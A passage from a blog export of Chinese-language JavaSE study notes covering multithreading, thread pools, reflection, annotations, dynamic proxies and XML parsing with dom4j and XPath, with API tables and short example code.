<h5 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h5><ul>
<li>加锁：将共享的资源上锁，每次只有一个线程能进入，访问完毕之后解锁，其他线程才能进来</li>
</ul>
<h5 id="方法一：同步代码块"><a href="#方法一：同步代码块" class="headerlink" title="方法一：同步代码块"></a>方法一：同步代码块</h5><ul>
<li><p>作用：把出现线程安全问题的核心代码块上锁</p>
</li>
<li><p>原理：每次只有一个线程可以进入核心代码，访问完毕之后解锁</p>
</li>
<li><p>格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(同步锁对象)&#123;</span><br><span class="line">  操作共享资源的代码(核心代码)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>理论上锁对象只要对于当前同时执行的线程来说是一个对象即可，但是这样会影响其他无关线程的运行</p>
</li>
<li><p>锁对象的规范</p>
<ul>
<li>使用共享资源作为锁对象</li>
<li>实例方法：this 作为锁对象</li>
<li>静态方法：字节码（类名.class）作为锁对象</li>
</ul>
</li>
</ul>
<h5 id="方法二：同步方法"><a href="#方法二：同步方法" class="headerlink" title="方法二：同步方法"></a>方法二：同步方法</h5><ul>
<li><p>作用：把出现线程安全问题的核心方法上锁</p>
</li>
<li><p>原理：每次只有一个线程可以进入核心方法，访问完毕之后解锁</p>
</li>
<li><p>格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="keyword">synchronized</span> 返回值类型 方法名称(形参列表)&#123;</span><br><span class="line">  操作共享资源的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>底层原理</p>
<ul>
<li>同步方法底层可以看作是隐式锁对象，只是锁的范围是整个方法代码</li>
<li>实例方法：this 作为锁对象，但是方法要高度面向对象</li>
<li>静态方法：字节码（类名.class）作为锁对象</li>
</ul>
</li>
</ul>
<h5 id="方法三：Lock-锁"><a href="#方法三：Lock-锁" class="headerlink" title="方法三：Lock 锁"></a>方法三：Lock 锁</h5><ul>
<li><p>Lock 实现更加广泛的锁定操作</p>
</li>
<li><p>Lock 是接口，不可以实例化，采用他的实现类 ReentrantLock 来构建 Lock 对象</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public ReentrantLock()</code></td>
<td>获得Lock锁的实现类对象</td>
</tr>
<tr>
<td><code>void lock()</code></td>
<td>获得锁</td>
</tr>
<tr>
<td><code>void unlock()</code></td>
<td>释放锁</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="线程通信"><a href="#线程通信" class="headerlink" title="线程通信"></a>线程通信</h4><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><ul>
<li>线程间相互发送数据，线程间共享一个资源即可实现线程通信</li>
</ul>
<h5 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h5><ul>
<li>通过共享一个数据的方式实现</li>
<li>根据共享数据的情况决定自己该怎么做，以及通知其他线程怎么做</li>
<li>生产者消费者模型</li>
</ul>
<h5 id="等待与唤醒"><a href="#等待与唤醒" class="headerlink" title="等待与唤醒"></a>等待与唤醒</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>void wait()</code></td>
<td>让当前线程等待并释放所占锁，直到另一个线程调用notify()方法或 notifyAll()方法</td>
</tr>
<tr>
<td><code>void notify()</code></td>
<td>唤醒正在等待的单个线程</td>
</tr>
<tr>
<td><code>void notifyAll()</code></td>
<td>唤醒正在等待的所有线程</td>
</tr>
</tbody></table>
<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>一种可以复用线程池的技术</li>
<li>线程池的接口：<code>ExecutorService</code></li>
</ul>
<h5 id="获得线程池对象"><a href="#获得线程池对象" class="headerlink" title="获得线程池对象"></a>获得线程池对象</h5><ul>
<li><p>方式一：用 ExecutorService 的实现类 ThreadPoolExcutor 自创一个线程池对象</p>
</li>
<li><p>方式二：使用 Executors 线程池的工具类调用方法返回不同特点的线程池对象</p>
</li>
<li><p>ThreadPoolExcutor 参数说明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> corePoolSize,										// 指定线程池的核心线程数量</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> maximumPoolSize,								// 指定线程池的最大线程数量</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">long</span> keepAliveTime,									// 指定临时线程最长存活时间</span></span></span><br><span class="line"><span class="params"><span class="function">  TimeUnit unit,								       // 指定存活时间的单位</span></span></span><br><span class="line"><span class="params"><span class="function">  BlockingQueue&lt;Runnable&gt; workQueue,    // 指定任务队列</span></span></span><br><span class="line"><span class="params"><span class="function">  ThreadFactory threadFactory,			    // 指定线程工厂 </span></span></span><br><span class="line"><span class="params"><span class="function">  RejectedExecutionHandler handler)</span> 	  <span class="comment">// 指定线程忙时的处理方式</span></span></span><br></pre></td></tr></table></figure></li>
<li><p>拒绝策略</p>
<table>
<thead>
<tr>
<th>策略</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td><code>ThreadPoolExecutor.AbortPolicy</code></td>
<td>丢弃任务并抛出RejectedExecutionException异常。<strong>是默认的策略</strong></td>
</tr>
<tr>
<td><code>ThreadPoolExecutor.DiscardPolicy</code></td>
<td>丢弃任务，但是不抛出异常  这是不推荐的做法</td>
</tr>
<tr>
<td><code>ThreadPoolExecutor.DiscardOldestPolicy</code></td>
<td>抛弃队列中等待最久的任务  然后把当前任务加入队列中</td>
</tr>
<tr>
<td><code>ThreadPoolExecutor.CallerRunsPolicy</code></td>
<td>由主线程负责调用任务的run()方法从而绕过线程池直接执行</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="线程池处理-Runnable-任务"><a href="#线程池处理-Runnable-任务" class="headerlink" title="线程池处理 Runnable 任务"></a>线程池处理 Runnable 任务</h5><ul>
<li><p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pools = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">  <span class="number">3</span>, </span><br><span class="line">  <span class="number">5</span>, </span><br><span class="line">  <span class="number">8</span>, </span><br><span class="line">  TimeUnit.SECONDS, </span><br><span class="line">  <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">6</span>),</span><br><span class="line">  Executors.defaultThreadFactory(), </span><br><span class="line">  <span class="keyword">new</span> ThreadPoolExecutor.AbortPolicy());</span><br><span class="line"></span><br><span class="line">Runnable target = <span class="keyword">new</span> MyRunnable();</span><br><span class="line">pool.execute(target);</span><br><span class="line">pool.shutdown();</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="线程池处理-Callable-任务"><a href="#线程池处理-Callable-任务" class="headerlink" title="线程池处理 Callable 任务"></a>线程池处理 Callable 任务</h5><ul>
<li><p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pools = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">  <span class="number">3</span>, </span><br><span class="line">  <span class="number">5</span>, </span><br><span class="line">  <span class="number">8</span>, </span><br><span class="line">  TimeUnit.SECONDS, </span><br><span class="line">  <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">6</span>),</span><br><span class="line">  Executors.defaultThreadFactory(), </span><br><span class="line">  <span class="keyword">new</span> ThreadPoolExecutor.AbortPolicy());</span><br><span class="line"></span><br><span class="line">Future&lt;String&gt; f1 = pool.submit(<span class="keyword">new</span> MyCallable(<span class="number">100</span>));</span><br><span class="line">System.out.println(f1.get());</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="工具类实现线程池"><a href="#工具类实现线程池" class="headerlink" title="工具类实现线程池"></a>工具类实现线程池</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  static ExecutorService newCachedThreadPool()</code></td>
<td>线程数量随着任务增加而增加，如果线程任务执行完毕且空闲了一段时间则会被回收掉。</td>
</tr>
<tr>
<td><code>public static ExecutorService newFixedThreadPool(int nThreads)</code></td>
<td>创建固定线程数量的线程池，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程替代它。</td>
</tr>
<tr>
<td><code>public  static ExecutorService newSingleThreadExecutor ()</code></td>
<td>创建只有一个线程的线程池对象，如果该线程出现异常而结束，那么线程池会补充一个新线程。</td>
</tr>
<tr>
<td><code>public  static ScheduledExecutorService newScheduledThreadPool(int corePoolSize)</code></td>
<td>创建一个线程池，可以实现在给定的延迟后运行任务，或者定期执行任务。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之框架技术</title>
    <url>/2022/01/25/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E6%A1%86%E6%9E%B6%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（九）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>反射是指对于任何一个Class类，在<strong>运行的时候</strong>都可以直接得到这个类全部成分</li>
<li>全部成分指构造器对象<code>Constructor</code>，成员变量对象<code>Field</code>，成员方法对象<code>Method</code></li>
<li>这种运行时动态获取类信息以及动态调用类中成分的能力称为Java语言的反射机制</li>
</ul>
<h5 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h5><ul>
<li><p>反射的第一步都是得到编译后的 Class 类对象，然后就可以得到 Class 的全部成分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HelloWorld.java -&gt; javac -&gt; HelloWorld.class</span><br><span class="line"></span><br><span class="line">Class c = HelloWorld.class;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h5><ul>
<li><p>方法一：Class类中的一个静态方法：forName(全限名：包名 + 类名)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c = Class.forName(<span class="string">&quot;poria.Test&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>方法二：类名.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c = Test.class;</span><br></pre></td></tr></table></figure></li>
<li><p>方式三：对象.getClass() 获取对象对应类的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test t = <span class="keyword">new</span> Test();</span><br><span class="line">Class c = t.getClass();</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="获取构造器对象"><a href="#获取构造器对象" class="headerlink" title="获取构造器对象"></a>获取构造器对象</h5><ul>
<li><p>Class 类用于获取构造器的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Constructor&lt;?&gt;[] getConstructors()</code></td>
<td>返回所有构造器对象的数组（只能拿public的）</td>
</tr>
<tr>
<td><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code></td>
<td>返回所有构造器对象的数组，存在就能拿到</td>
</tr>
<tr>
<td><code>Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;...  parameterTypes)</code></td>
<td>返回单个构造器对象（只能拿public的）</td>
</tr>
<tr>
<td><code>Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;...  parameterTypes)</code></td>
<td>返回单个构造器对象，存在就能拿到</td>
</tr>
</tbody></table>
</li>
<li><p>Constructor 类用于创建对象的方法</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>T newInstance(Object...  initargs)</code></td>
<td>根据指定的构造器创建对象</td>
</tr>
<tr>
<td><code>public void setAccessible(boolean  flag)</code></td>
<td>设置为true,表示取消访问检查，进行暴力反射</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="获取成员变量对象"><a href="#获取成员变量对象" class="headerlink" title="获取成员变量对象"></a>获取成员变量对象</h5><ul>
<li><p>Class 类用于获取成员变量的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Field[] getFields()</code></td>
<td>返回所有成员变量对象的数组（只能拿public的）</td>
</tr>
<tr>
<td><code>Field[] getDeclaredFields()</code></td>
<td>返回所有成员变量对象的数组，存在就能拿到</td>
</tr>
<tr>
<td><code>Field getField(String  name)</code></td>
<td>返回单个成员变量对象（只能拿public的）</td>
</tr>
<tr>
<td><code>Field getDeclaredField(String  name)</code></td>
<td>返回单个成员变量对象，存在就能拿到</td>
</tr>
</tbody></table>
</li>
<li><p>Field 类中用于取值、赋值的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>void set(Object obj, Object value)</code></td>
<td>赋值</td>
</tr>
<tr>
<td><code>Object get(Object obj)</code></td>
<td>获取值</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="获取方法对象"><a href="#获取方法对象" class="headerlink" title="获取方法对象"></a>获取方法对象</h5><ul>
<li><p>Class 类中用于获取成员方法的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Method[] getMethods()</code></td>
<td>返回所有成员方法对象的数组（只能拿public的）</td>
</tr>
<tr>
<td><code>Method[] getDeclaredMethods()</code></td>
<td>返回所有成员方法对象的数组，存在就能拿到</td>
</tr>
<tr>
<td><code>Method getMethod(String  name, Class&lt;?&gt;... parameterTypes)</code></td>
<td>返回单个成员方法对象（只能拿public的）</td>
</tr>
<tr>
<td><code>Method getDeclaredMethod(String  name, Class&lt;?&gt;... parameterTypes)</code></td>
<td>返回单个成员方法对象，存在就能拿到</td>
</tr>
</tbody></table>
</li>
<li><p>Method 类中用于触发执行的方法</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Object invoke(Object obj, Object... args)</code></td>
<td>运行方法  参数一：用obj对象调用该方法  参数二：调用方法的传递的参数（如果没有就不写）  返回值：方法的返回值（如果没有就不写）</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><ul>
<li>在运行时获得一个类的全部成分</li>
<li>破坏封装性</li>
<li>破坏泛型的约束性</li>
<li>做高级框架底层技术</li>
</ul>
<h4 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>Java 语言中的类、构造器、方法、成员变量、参数等都可以被注解进行标注</li>
<li>对 Java 中类、方法、成员变量做标记，然后进行特殊处理</li>
</ul>
<h5 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h5><ul>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> 注解名称 &#123;</span><br><span class="line">  <span class="keyword">public</span> 属性类型 属性名() <span class="keyword">default</span> 默认值 ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>value 属性，如果只有一个 value 属性的情况下，使用 value 属性的时候可以省略 value 名称不写</p>
</li>
</ul>
<h5 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h5><ul>
<li><p>就是用来注解注解的注解（绕口令</p>
</li>
<li><p>元注解有两个</p>
<ul>
<li>@Target：约束自定义注解只能在哪些地方使用</li>
<li>常用值<ul>
<li>TYPE，类，接口</li>
<li>FIELD，成员变量</li>
<li>METHOD，成员方法</li>
<li>PARAMETER, 方法参数</li>
<li>CONSTRUCTOR, 构造器</li>
<li>LOCAL_VARIABLE, 局部变量</li>
</ul>
</li>
<li>@Retention：申明注解的生命周期</li>
<li>常用值<ul>
<li>SOURCE： 注解只作用在源码阶段，生成的字节码文件中不存在</li>
<li>CLASS： 注解作用在源码阶段，字节码文件阶段，运行阶段不存在，默认值.</li>
<li>RUNTIME：注解作用在源码阶段，字节码文件阶段，运行阶段（开发常用）</li>
</ul>
</li>
</ul>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.METHOD,ElementType.FIELD&#125;)</span> <span class="comment">// 元注解</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="comment">// 一直活着，在运行阶段这个注解也不消失</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyTest &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="注解解析"><a href="#注解解析" class="headerlink" title="注解解析"></a>注解解析</h5><ul>
<li><p>注解的操作中经常需要进行解析，注解的解析就是判断是否存在注解，存在注解就解析出内容</p>
</li>
<li><p>注解相关接口</p>
<ul>
<li>Annotation：注解的顶级接口，注解都是 Annotation 类型的对象</li>
<li>AnnotatedElement：该接口定义了与注解解析相关的解析方法</li>
</ul>
</li>
<li><p>常用方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Annotation[] getDeclaredAnnotations()</code></td>
<td>获得当前对象上使用的所有注解，返回注解数组。</td>
</tr>
<tr>
<td><code>T getDeclaredAnnotation(Class&lt;T&gt;  annotationClass)</code></td>
<td>根据注解类型获得对应注解对象</td>
</tr>
<tr>
<td><code>boolean isAnnotationPresent(Class&lt;Annotation&gt;  annotationClass)</code></td>
<td>判断当前对象是否使用了指定的注解，如果使用了则返回true，否则false</td>
</tr>
</tbody></table>
</li>
<li><p>所有的类成分Class，Method，Field，Constructor，都实现了 AnnotatedElement 接口他们都拥有解析注解的能力</p>
</li>
<li><p>技巧</p>
<ul>
<li>注解在哪个成分上，我们就先拿哪个成分对象。</li>
<li>比如注解作用成员方法，则要获得该成员方法对应的 Method 对象，再来拿上面的注解</li>
<li>比如注解作用在类上，则要该类的 Class 对象，再来拿上面的注解</li>
<li>比如注解作用在成员变量上，则要获得该成员变量对应的 Field 对象，再来拿上面的注解</li>
</ul>
</li>
</ul>
<h5 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h5><ul>
<li><p>单元测试就是针对最小的功能单元编写测试代码，Java 程序最小的功能单元是方法，因此，单元测试就是针对 Java 方法的测试，进而检查方法的正确性</p>
</li>
<li><p>测试方法使用 @Test 注解标记</p>
</li>
<li><p>定义的测试方法必须是无参数无返回值，且公开的方法</p>
<table>
<thead>
<tr>
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>@Test</code></td>
<td>测试方法</td>
</tr>
<tr>
<td><code>@BeforeEach</code></td>
<td>用来修饰实例方法，该方法会在每一个测试方法执行之前执行一次。</td>
</tr>
<tr>
<td><code>@AfterEach</code></td>
<td>用来修饰实例方法，该方法会在每一个测试方法执行之后执行一次。</td>
</tr>
<tr>
<td><code>@BeforeAll</code></td>
<td>用来静态修饰方法，该方法会在所有测试方法之前只执行一次。</td>
</tr>
<tr>
<td><code>@AfterAll</code></td>
<td>用来静态修饰方法，该方法会在所有测试方法之后只执行一次。</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>代理就是被代理者没有能力或者不愿意去完成某件事情，需要找个人代替自己去完成这件事，动态代理就是用来对业务功能（方法）进行代理的</li>
</ul>
<h5 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h5><ul>
<li>必须有接口，实现类要实现接口</li>
<li>创建一个实现类的对象，该对象为业务对象，然后为业务对象创建一个代理对象</li>
</ul>
<h5 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T  <span class="title">getProxy</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 返回了一个代理对象了</span></span><br><span class="line">    <span class="keyword">return</span> (T)Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(),</span><br><span class="line">            <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    <span class="comment">// 参数一：代理对象本身</span></span><br><span class="line">                    <span class="comment">// 参数二：正在被代理的方法</span></span><br><span class="line">                    <span class="comment">// 参数三：被代理方法，应该传入的参数</span></span><br><span class="line">                   <span class="keyword">long</span> startTimer = System .currentTimeMillis();</span><br><span class="line">                    <span class="comment">// 马上触发方法的真正执行。(触发真正的业务功能)</span></span><br><span class="line">                    Object result = method.invoke(obj, args);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">long</span> endTimer = System.currentTimeMillis();</span><br><span class="line">                    System.out.println(method.getName() + <span class="string">&quot;方法耗时：&quot;</span> + (endTimer - startTimer) / <span class="number">1000.0</span> + <span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 把业务功能方法执行的结果返回给调用者</span></span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul>
<li>非常的灵活，支持任意接口类型的实现类对象做代理，也可以直接为接本身做代理</li>
<li>可以为被代理对象的所有方法做代理</li>
<li>可以在不改变方法源码的情况下，实现对方法功能的增强</li>
<li>不仅简化了编程工作、提高了软件系统的可扩展性，同时也提高了开发效率</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之XML</title>
    <url>/2022/01/26/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8BXML/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（完）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="解析技术"><a href="#解析技术" class="headerlink" title="解析技术"></a>解析技术</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>XML 主要用于存储数据、做配置信息、进行数据传输</li>
<li>主要有两种解析方式：SAX 解析、DOM 解析</li>
</ul>
<h5 id="常见解析工具"><a href="#常见解析工具" class="headerlink" title="常见解析工具"></a>常见解析工具</h5><table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>JAXP</code></td>
<td>SUN公司提供的一套XML的解析的API</td>
</tr>
<tr>
<td><code>JDOM</code></td>
<td>JDOM是一个开源项目，它基于树型结构，利用纯JAVA的技术对XML文档实现解析、生成、序列化以及多种操作。</td>
</tr>
<tr>
<td><code>dom4j</code></td>
<td>是JDOM的升级品，用来读写XML文件的。具有性能优异、功能强大和极其易使用的特点，它的性能超过sun公司官方的dom  技术，同时它也是一个开放源代码的软件，Hibernate也用它来读写配置文件。</td>
</tr>
<tr>
<td><code>jsoup</code></td>
<td>功能强大DOM方式的XML解析开发包，尤其对HTML解析更加方便</td>
</tr>
</tbody></table>
<h5 id="文档对象模型"><a href="#文档对象模型" class="headerlink" title="文档对象模型"></a>文档对象模型</h5><ul>
<li>Document 对象：整个 XML 文档</li>
<li>Node 对象：<ul>
<li>Element 对象：标签</li>
<li>Attribute 对象：属性</li>
<li>Text 对象：文本内容</li>
</ul>
</li>
</ul>
<h5 id="Dom4j-解析框架"><a href="#Dom4j-解析框架" class="headerlink" title="Dom4j 解析框架"></a>Dom4j 解析框架</h5><ul>
<li><p>SAXReader 类</p>
<table>
<thead>
<tr>
<th>构造器/方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public SAXReader()</code></td>
<td>创建Dom4J的解析器对象</td>
</tr>
<tr>
<td><code>Document read(String url)</code></td>
<td>加载XML文件成为Document对象</td>
</tr>
</tbody></table>
</li>
<li><p>Document 类</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Element getRootElement()</code></td>
<td>获得根元素对象</td>
</tr>
</tbody></table>
</li>
<li><p>解析节点</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>List&lt;Element&gt; elements()</code></td>
<td>得到当前元素下所有子元素</td>
</tr>
<tr>
<td><code>List&lt;Element&gt;  elements(String name)</code></td>
<td>得到当前元素下指定名字的子元素返回集合</td>
</tr>
<tr>
<td><code>Element  element(String name)</code></td>
<td>得到当前元素下指定名字的子元素,如果有很多名字相同的返回第一个</td>
</tr>
<tr>
<td><code>String  getName()</code></td>
<td>得到元素名字</td>
</tr>
<tr>
<td><code>String attributeValue(String name)</code></td>
<td>通过属性名直接得到属性值</td>
</tr>
<tr>
<td><code>String  elementText(子元素名)</code></td>
<td>得到指定名称的子元素的文本</td>
</tr>
<tr>
<td><code>String  getText()</code></td>
<td>得到文本</td>
</tr>
</tbody></table>
</li>
<li><p>用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  <span class="comment">// 1、导入框架</span></span><br><span class="line">  <span class="comment">// 2、创建SaxReader对象</span></span><br><span class="line">  SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">  <span class="comment">// 3、加载XML文件成为文档对象Document对象。</span></span><br><span class="line">  Document document = saxReader.read(Dom4JTest2.class.getResourceAsStream(<span class="string">&quot;/poria.xml&quot;</span>));</span><br><span class="line">  <span class="comment">// 4、先拿根元素</span></span><br><span class="line">  Element root = document.getRootElement();</span><br><span class="line">  <span class="comment">// 5、提取contact子元素</span></span><br><span class="line">  List&lt;Element&gt; contactEles = root.elements(<span class="string">&quot;contact&quot;</span>);</span><br><span class="line">  <span class="comment">// 6、准备一个ArrayList集合封装联系人信息</span></span><br><span class="line">  List&lt;Contact&gt; contacts = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">  <span class="comment">// 7、遍历Contact子元素</span></span><br><span class="line">  <span class="keyword">for</span> (Element contactEle : contactEles) &#123;</span><br><span class="line">    <span class="comment">// 8、每个子元素都是一个联系人对象</span></span><br><span class="line">    Contact contact = <span class="keyword">new</span> Contact();</span><br><span class="line">    <span class="comment">// 因为解析出的值都是 String 类型，所以需要类型转换</span></span><br><span class="line">    contact.setId(Integer.valueOf(contactEle.attributeValue(<span class="string">&quot;id&quot;</span>)));</span><br><span class="line">    contact.setVip(Boolean.valueOf(contactEle.attributeValue(<span class="string">&quot;vip&quot;</span>)));</span><br><span class="line">    contact.setName(contactEle.elementTextTrim(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    contact.setGender(contactEle.elementTextTrim(<span class="string">&quot;gender&quot;</span>).charAt(<span class="number">0</span>));</span><br><span class="line">    contact.setEmail(contactEle.elementText(<span class="string">&quot;email&quot;</span>));</span><br><span class="line">    <span class="comment">// 9、把联系人对象数据加入到List集合</span></span><br><span class="line">    contacts.add(contact);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 10、遍历List集合</span></span><br><span class="line">  <span class="keyword">for</span> (Contact contact : contacts) &#123;</span><br><span class="line">    System.out.println(contact);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="检索技术"><a href="#检索技术" class="headerlink" title="检索技术"></a>检索技术</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>XPath 在解析 XML 文档方面提供了一独树一帜的路径思想，更加优雅，高效</li>
<li>XPath 使用路径表达式来定位 XML 文档中的元素节点或属性节点</li>
</ul>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Node selectSingleNode(&quot;表达式&quot;)</code></td>
<td>获取符合表达式的唯一元素</td>
</tr>
<tr>
<td><code>List&lt;Node&gt; selectNodes(&quot;表达式&quot;)</code></td>
<td>获取符合表达式的元素集合</td>
